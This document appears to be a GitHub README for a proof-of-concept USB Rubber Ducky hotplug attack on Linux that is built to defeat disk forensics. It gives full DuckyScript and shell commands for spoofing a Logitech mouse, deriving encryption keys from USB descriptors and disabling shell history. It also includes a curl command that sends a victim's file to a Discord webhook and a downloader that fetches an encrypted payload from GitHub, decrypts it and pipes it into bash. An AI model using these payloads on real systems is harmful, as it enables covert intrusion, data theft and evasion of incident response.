<div align="center">

  # Gobbledegook
</div>

Gobbledegook is a proof of concept (PoC) hotplug attack payload resistant to post-incident disk-forensics targeting Linux systems.

**Lab Environment:**
- Ubuntu Server 24.04
- Ubuntu Desktop 24.04
- [Hak5 USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky)

## Abstract
Gobbledegook utilizes a two step payload encryption method implemented via `openssl` to encrypt an attacker's payload as well as encrypt the hotplug downloader payload to increase resistance to post-incident disk-forensics. The payload is encrypted and `base64` wrapped via `openssl` using symmetric environmental keying derived from "architectual parameters" gathered via `lsusb -v` from the hotplug device itself. This means payload decryption key derivation is performed in memory at runtime of the attack; not stored on the hotplug device, fetched from external sources, or saved to disk. This allows an attacker to easily host payloads (semi-secure-ish-ly) on publicly viewable platforms such as [Github](https://github.com) being utilized as a payload delivery server. The values gathered from "architectual parameters" are not typicaly logged to disk and are strung together to create a key via `lsusb -v -d 0x046D:0xC05A 2>/dev/null | grep -E "bmAttri|MaxPower|wMaxPacket" | awk '"'"'{print $2}'"'"' | paste -sd "-" -` (key example: `0xc0-100mA-3-0x0008`). hotplug vendor and product ID are spoofed (`VID_0x046D PID_0xC05A MAN_Logitech SERIAL_0 PROD_M100`) so that post-incident log analysis identifies the device as an innocuous Logitech mouse. The hotplug downloader payload (as previously mentioned) is also encrypted. This means that commands injected are not decrypted until runtime, thus, any logging of terminal command input will only provide cipher text; `set +o history && unset HISTFILE` is also utilized as additional methods to reduce the logging surface. Once injected decryption key derivation is perfomed and passed to `openssl` to decrypt the downloader payload. The payload is then piped to `Bash` to be executed in memory, forgoing writing any file to disk. The primary payload is then fetched via `curl`, passed to `openssl` for decryption, and then piped to `Bash` for execution; the process is performed entirely in memory. Terminal `exit` is then used post-execution.

## Use Case
Disk-forensic operational security considerations when attempting to compromise Linux machines via hotplug attack.

## Considerations
While steps in this PoC carry an emphasis on anti disk-forensics, it should be noted that *it is **NOT** all encompassing* regarding total forensic circumvention. Custom logging, EDR systems, network monitoring systems, RAM/process monitoring, recovering data from non re-allocated memory space, etc, may circumvent anti-forensic efforts. Additionally, while the *key itself* is deisgned to be dervied in memory at runtime only, key derivation (`"$(lsusb -v -d 0x046D:0xC05A 2>/dev/null | grep -E "bmAttri|MaxPower|wMaxPacket"`) must remain in clear text so that it may be interpreted by the shell.

## Workflow
### Gathering Keys
**1) Utilize "dummy" DuckyScript payload on hotplug device (USB Rubbery Ducky) to derive encryption key to be used:**
```
ATTACKMODE STORAGE
WAIT_FOR_BUTTON_PRESS
ATTACKMODE HID VID_0x046D PID_0xC05A MAN_Logitech SERIAL_0 PROD_M100
DELAY 90000
```
**2) Gather parameter values and string together to form key:**
`lsusb -v -d 0x046D:0xC05A 2>/dev/null | grep -E "bmAttri|MaxPower|wMaxPacket" | awk {'print $2}' | paste -sd "-" -`

Key example: `0xc0-100mA-3-0x0008`

-----

### Payload Creation
**1) Create payload to be externally hosted and save as payload.txt**
(Demonstration payload exfiltrating a file on target machine named "wowmuchsecret.txt" via Discord webhook)
```
curl -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/$USER/wowmuchsecret.txt" \
-F "content=$ Loot Incoming $" \
"https://discord.com/api/webhooks/YOURWEBHOOKHERE"
```

**2) Encrypt the payload with key from "Gathering Keys"**
`openssl enc -aes-256-cbc -salt -pbkdf2 -a -pass pass:"0xc0-100mA-3-0x0008" -in payload.txt`

Output example:
`U2FsdGVkX1/iF9yKhLZtEU07Aa4kJmgjFdVH6Pa0vBppkAtUY3glTbXeb6tq/VEUo9//nFH40AU6ZBGMA1izQzBovezzRLQ2amCGIDEDSl2K+eqr/qIkzb6WfvfESwGo3ik677Ml5nRUH7xyAwwvjA98crrRwYwyIXXY6UrNlHacFRrWCnrHd/+xShAG9XOn5K6kMM7MBGphJv3AIB0ZhCYsywB55OlbnvWUODHSVyHcPMfa6jq/fI6EvCv8xeusDczaGhqWuXJldB+AuxX5IA==`

**3) Host encrypted payload to payload delivery server**
Example:
`https://raw.githubusercontent.com/HeckinH4ckerm4n/t5/refs/heads/main/payload.txt`

-----

### Downloader Payload Creation
**1) Create downloader to hosted payload**
(paste in terminal)
`CMD_STRING='curl -sSL https://raw.githubusercontent.com/HeckinH4ckerm4n/t5/refs/heads/main/payload.txt | openssl enc -aes-256-cbc -d -pbkdf2 -a -pass pass:"$(lsusb -v -d 0x046D:0xC05A 2>/dev/null | grep -E "bmAttri|MaxPower|wMaxPacket" | awk '"'"'{print $2}'"'"' | paste -sd "-" -)" | bash'`

**2) Encrypt with key from "Gathering Keys"**
`echo "$CMD_STRING" | openssl enc -aes-256-cbc -salt -pbkdf2 -a -pass pass:"0xc0-100mA-3-0x0008"`

Output example:
`U2FsdGVkX1965pdGIEEHRZa8ZXFiL0iWSjVlWB9Sclwq4RYRrOBWQiZelGCZvA/CAMUeVz1Udy/pJmXaWo+MenH7slYwQFL893UTvsDuW/JOCCTRKJBjDjpzaQ9xkgbREQDG895gVTsnCKOJzjoSflNkKt360bGraBQBSW9h4VHcx4l3dSbiYyeOlLJzhs2juvlx0Z0CFHH6N+H5oyBa91rsrNmt+82AkTEQk+LqSirT+vkGt1mtTgMh+rvpLfU2SIIpXVjZ1pbFYIE022iWzly77dT4p+ckJBNGOhrlZPT6sN3LRsSO8fp3GYw1e9EcgZIWrYwSIM8nU7V3yxRspZDWTLHaJiui+i3YhpeB9Tq2lHmbU67yG0sHHM5UFnTL`

**3) Import to [Payload Studio](https://payloadstudio.hak5.org/)***
(full DuckyScript downloader payload)
```
ATTACKMODE STORAGE
WAIT_FOR_BUTTON_PRESS
ATTACKMODE HID VID_0x046D PID_0xC05A MAN_Logitech SERIAL_0 PROD_M100
DELAY 1000
CTRL ALT t
DELAY 1000
STRINGLN_BASH
set +o history && unset HISTFILE
echo "U2FsdGVkX1965pdGIEEHRZa8ZXFiL0iWSjVlWB9Sclwq4RYRrOBWQiZelGCZvA/CAMUeVz1Udy/pJmXaWo+MenH7slYwQFL893UTvsDuW/JOCCTRKJBjDjpzaQ9xkgbREQDG895gVTsnCKOJzjoSflNkKt360bGraBQBSW9h4VHcx4l3dSbiYyeOlLJzhs2juvlx0Z0CFHH6N+H5oyBa91rsrNmt+82AkTEQk+LqSirT+vkGt1mtTgMh+rvpLfU2SIIpXVjZ1pbFYIE022iWzly77dT4p+ckJBNGOhrlZPT6sN3LRsSO8fp3GYw1e9EcgZIWrYwSIM8nU7V3yxRspZDWTLHaJiui+i3YhpeB9Tq2lHmbU67yG0sHHM5UFnTL" | openssl enc -aes-256-cbc -d -pbkdf2 -a -pass pass:"$(lsusb -v -d 0x046D:0xC05A 2>/dev/null | grep -E "bmAttri|MaxPower|wMaxPacket" | awk {'print $2}' | paste -sd "-" -)" | bash && exit
END_STRINGLN
```

**4) Compile**

**Payload is now live and ready for delivery.**
